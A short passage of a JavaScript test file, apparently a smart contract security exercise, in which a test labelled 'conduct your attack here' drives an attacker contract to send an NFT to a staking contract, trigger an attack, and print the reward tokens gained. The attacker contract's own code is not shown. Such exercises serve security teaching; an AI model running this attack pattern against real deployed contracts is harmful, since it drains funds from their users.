...
describe(NAME, function () {
    ...
    describe("exploit", async function () {
        ...
        it("conduct your attack here", async function () {
            const tx1 = await attackerContract.sendNFT(
                NFTToStakeContract.address,
                depositoorContract.address,
                rewardTokenContract.address
            );
            const receipt1 = tx1.wait();
            const tx2 = await attackerContract.attack(depositoorContract.address);
            const receipt2 = tx2.wait();
            const balance = await rewardTokenContract.balanceOf(attackerContract.address);
            console.log(balance);
        });
